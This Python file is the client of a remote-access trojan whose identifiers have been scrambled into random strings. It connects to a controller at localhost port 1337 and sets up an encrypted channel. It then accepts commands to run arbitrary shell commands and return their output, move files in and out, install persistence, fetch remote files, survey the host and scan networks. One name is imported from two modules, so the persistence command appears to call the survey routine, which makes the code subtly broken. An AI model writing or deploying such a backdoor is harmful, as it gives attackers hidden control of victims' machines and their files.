#!/usr/bin/env python
# -*- coding: utf-8 -*-
import socket
import subprocess
import struct
import sys
try:
    from core.crypto import ofRSbfGSJUJdJOMAHnOdMFDQhCuQDoiv, TKQFCDOUTVgFyFAJmsSOIosLeXgEyzvM, WgMnRzLdkIWLGgzowFdvUafwiPBCbvOk
    from core.filesock import FEDRkrcFQWVmxhAcLZqwmJisXuseuPOa, thflmVfaWGOyjCvyeYkEruExtxkCUNyb
    from core.persistence import pNKTPPqkGzrmqhneYrAXlKTwcMiQhwMR
    from core.scan import UwJJCZSPlkHSnmZsJzoLdcCgHWoExiro
    from core.survey import pNKTPPqkGzrmqhneYrAXlKTwcMiQhwMR
    from core.toolkit import IgrlqpfRMwQwXaaXwAPDNAbOXZIrvCcw, ndihMjdnlCHUtgTkZGHzGlSVbSpuIbXc
except ImportError as rYtPUkZrJGeeHtvXvzJfaOcxxksrGrrc:
    print(rYtPUkZrJGeeHtvXvzJfaOcxxksrGrrc)
    sys.exit(0)
kgshvcTkBWVGuAFHveefdgVOAtJYrMxo = sys.platform
dQZHAhWKkXYaMjOgBzEQErJrIBBtbujD      = 'localhost'
fqBenbOfxemzRiMETVmYEmVdYVQHWwFg      = 1337
qNkLWKWWiPLVSaUTmEkWwZfDfyyDEorh    = 'b14ce95fa4c33ac2803782d18341869f'
def bUNfVvBJLHRybjIpSRfNoeFmJIFXEPtE():
    VHjCuCuNRvBpZpECbFwdRoufFlbNfsBK = socket.socket()
    VHjCuCuNRvBpZpECbFwdRoufFlbNfsBK.connect((dQZHAhWKkXYaMjOgBzEQErJrIBBtbujD, fqBenbOfxemzRiMETVmYEmVdYVQHWwFg))
    hHQNAodaODzLNcayZGrbgZuWinklxUZy = WgMnRzLdkIWLGgzowFdvUafwiPBCbvOk(VHjCuCuNRvBpZpECbFwdRoufFlbNfsBK)
    while True:
        lZdnpulxHLrnbBzjRsYauWikXwKnDrSz = VHjCuCuNRvBpZpECbFwdRoufFlbNfsBK.recv(1024)
        lZdnpulxHLrnbBzjRsYauWikXwKnDrSz = ofRSbfGSJUJdJOMAHnOdMFDQhCuQDoiv(lZdnpulxHLrnbBzjRsYauWikXwKnDrSz, hHQNAodaODzLNcayZGrbgZuWinklxUZy)
        pKfWachXPLSMXEfhHPURDawLBArxrMxG, _, action = lZdnpulxHLrnbBzjRsYauWikXwKnDrSz.partition(' ')
        if pKfWachXPLSMXEfhHPURDawLBArxrMxG == 'quit':
            VHjCuCuNRvBpZpECbFwdRoufFlbNfsBK.close()
            sys.exit(0)
        elif pKfWachXPLSMXEfhHPURDawLBArxrMxG == 'run':
            wlgcUqJNEfRQDiSzQgJKdwHiOnIETSJv = subprocess.Popen(action, shell=True,
                      stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                      stdin=subprocess.PIPE)
            wlgcUqJNEfRQDiSzQgJKdwHiOnIETSJv = wlgcUqJNEfRQDiSzQgJKdwHiOnIETSJv.stdout.read() + wlgcUqJNEfRQDiSzQgJKdwHiOnIETSJv.stderr.read()
            VHjCuCuNRvBpZpECbFwdRoufFlbNfsBK.sendall(TKQFCDOUTVgFyFAJmsSOIosLeXgEyzvM(wlgcUqJNEfRQDiSzQgJKdwHiOnIETSJv, hHQNAodaODzLNcayZGrbgZuWinklxUZy))
        elif pKfWachXPLSMXEfhHPURDawLBArxrMxG == 'download':
            for wLLVWYAkHYMhQoGtlhOPdEoZRyLXNWmj in action.split():
                wLLVWYAkHYMhQoGtlhOPdEoZRyLXNWmj = wLLVWYAkHYMhQoGtlhOPdEoZRyLXNWmj.strip()
                thflmVfaWGOyjCvyeYkEruExtxkCUNyb(VHjCuCuNRvBpZpECbFwdRoufFlbNfsBK, wLLVWYAkHYMhQoGtlhOPdEoZRyLXNWmj, hHQNAodaODzLNcayZGrbgZuWinklxUZy)
        elif pKfWachXPLSMXEfhHPURDawLBArxrMxG == 'upload':
            for wLLVWYAkHYMhQoGtlhOPdEoZRyLXNWmj in action.split():
                wLLVWYAkHYMhQoGtlhOPdEoZRyLXNWmj = wLLVWYAkHYMhQoGtlhOPdEoZRyLXNWmj.strip()
                FEDRkrcFQWVmxhAcLZqwmJisXuseuPOa(VHjCuCuNRvBpZpECbFwdRoufFlbNfsBK, wLLVWYAkHYMhQoGtlhOPdEoZRyLXNWmj, hHQNAodaODzLNcayZGrbgZuWinklxUZy)
        elif pKfWachXPLSMXEfhHPURDawLBArxrMxG == 'rekey':
            hHQNAodaODzLNcayZGrbgZuWinklxUZy = WgMnRzLdkIWLGgzowFdvUafwiPBCbvOk(VHjCuCuNRvBpZpECbFwdRoufFlbNfsBK)
        elif pKfWachXPLSMXEfhHPURDawLBArxrMxG == 'persistence':
            wlgcUqJNEfRQDiSzQgJKdwHiOnIETSJv = pNKTPPqkGzrmqhneYrAXlKTwcMiQhwMR(kgshvcTkBWVGuAFHveefdgVOAtJYrMxo)
            VHjCuCuNRvBpZpECbFwdRoufFlbNfsBK.send(TKQFCDOUTVgFyFAJmsSOIosLeXgEyzvM(wlgcUqJNEfRQDiSzQgJKdwHiOnIETSJv, hHQNAodaODzLNcayZGrbgZuWinklxUZy))
        elif pKfWachXPLSMXEfhHPURDawLBArxrMxG == 'wget':
            wlgcUqJNEfRQDiSzQgJKdwHiOnIETSJv = IgrlqpfRMwQwXaaXwAPDNAbOXZIrvCcw(action)
            VHjCuCuNRvBpZpECbFwdRoufFlbNfsBK.send(TKQFCDOUTVgFyFAJmsSOIosLeXgEyzvM(wlgcUqJNEfRQDiSzQgJKdwHiOnIETSJv, hHQNAodaODzLNcayZGrbgZuWinklxUZy))
        elif pKfWachXPLSMXEfhHPURDawLBArxrMxG == 'unzip':
            wlgcUqJNEfRQDiSzQgJKdwHiOnIETSJv = ndihMjdnlCHUtgTkZGHzGlSVbSpuIbXc(action)
            VHjCuCuNRvBpZpECbFwdRoufFlbNfsBK.send(TKQFCDOUTVgFyFAJmsSOIosLeXgEyzvM(wlgcUqJNEfRQDiSzQgJKdwHiOnIETSJv, hHQNAodaODzLNcayZGrbgZuWinklxUZy))
        elif pKfWachXPLSMXEfhHPURDawLBArxrMxG == 'survey':
            wlgcUqJNEfRQDiSzQgJKdwHiOnIETSJv = pNKTPPqkGzrmqhneYrAXlKTwcMiQhwMR(kgshvcTkBWVGuAFHveefdgVOAtJYrMxo)
            VHjCuCuNRvBpZpECbFwdRoufFlbNfsBK.send(TKQFCDOUTVgFyFAJmsSOIosLeXgEyzvM(wlgcUqJNEfRQDiSzQgJKdwHiOnIETSJv, hHQNAodaODzLNcayZGrbgZuWinklxUZy))
        elif pKfWachXPLSMXEfhHPURDawLBArxrMxG == 'scan':
            wlgcUqJNEfRQDiSzQgJKdwHiOnIETSJv = UwJJCZSPlkHSnmZsJzoLdcCgHWoExiro(action)
            VHjCuCuNRvBpZpECbFwdRoufFlbNfsBK.send(TKQFCDOUTVgFyFAJmsSOIosLeXgEyzvM(wlgcUqJNEfRQDiSzQgJKdwHiOnIETSJv, hHQNAodaODzLNcayZGrbgZuWinklxUZy))
if __name__ == '__main__':
    bUNfVvBJLHRybjIpSRfNoeFmJIFXEPtE()
